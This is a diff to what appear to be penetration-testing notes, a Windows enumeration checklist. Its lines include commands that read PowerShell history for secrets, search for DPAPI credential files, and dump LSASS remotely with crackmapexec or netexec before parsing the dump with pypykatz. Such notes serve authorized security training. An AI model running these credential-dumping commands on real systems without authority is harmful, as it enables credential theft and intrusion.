@@ -8,6 +8,7 @@ Checklist for enumeration:
 #windows-enum
 ```powershell
 whoami /groups
+whoami /priv
 (Get-PSReadlineOption).HistorySavePath
 type (Get-PSReadlineOption).HistorySavePath
 Get-LocalUser
@@ -64,7 +65,7 @@ use winpeas.exe, search for DPAPI: `_Checking for DPAPI Credential Files`_
 ```powershell
 $password = ConvertTo-SecureString $PASS -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($USER, $password)
-Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+Enter-PSSession -ComputerName $PC_NAME -Credential $cred
 ```
 
 Run as administrator:
@@ -130,9 +131,9 @@ whoami /priv
 crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
 pypykatz lsa minidump lsass.DMP
 ```
-or using netexec (faster, more modern)
+or using netexec
 ```bash
-nxc smb $TARGET_IP -u $USER -p $PASSWORD -M nanodump
+netexec smb $TARGET_IP -u $USER -p $PASSWORD -M nanodump
 ```
 
 run in a non-interactive shell
